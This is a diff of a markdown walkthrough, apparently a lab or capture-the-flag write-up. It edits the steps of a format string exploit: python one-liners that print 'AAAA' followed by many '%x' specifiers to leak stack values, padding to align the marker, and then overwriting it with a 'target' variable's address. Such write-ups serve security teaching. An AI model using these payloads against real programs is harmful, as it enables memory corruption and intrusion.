@@ -53,26 +53,28 @@ Should return: ![Alt text](image-3.png)
     We can run a command that will bring us hexadecimal values up 143 stack positions
 
 11. Try and fail
-    Try 143 spaces and see if you can see **414141** (representation of AAAA)
+    Try 143 spaces and see if you can see **414141** (representation of AAAA) (the number might be different for you depending on the distance)
 ```
      run `(python -c 'print "AAAA" + ".%x." * 143+"%x"')`
 ```
 
 The output will be something like this: ![Alt text](image-4.png)
     
-    Try to increase 143 to 146
+Next I try to increase 143 to 146
+
 ```
      run `(python -c 'print "AAAA" + ".%x." * 146+"%x"')`
 ```
 Output: ![Alt text](image-5.png)
-    Ok, I can now see the hexadecimal representaion of AAAA but it is not at the end of the output, I need to get rid of the '00' so that my last 4bits point exactly to AAAA
 
-    Try with adding extra padding (BB)
+Ok, I can now see the hexadecimal representation of AAAA but it is not at the end of the output, I need to get rid of the '00' so that my last 4bits point exactly to AAAA
+
+Try with adding extra padding (BB):
 ```
     run `(python -c 'print "AAAA" +"BBB"+ "%x." * 146+"%x"')`
 ```
    ![Alt text](image-8.png)
- My pointer is now pointing to the hexadecimal representation of 'AAAA' exactly
+My pointer is now pointing to the hexadecimal representation of 'AAAA' exactly
 
 12. Replace AAAA with the address of the 'target' variable 
     To find the target variable type: '''p &target '''
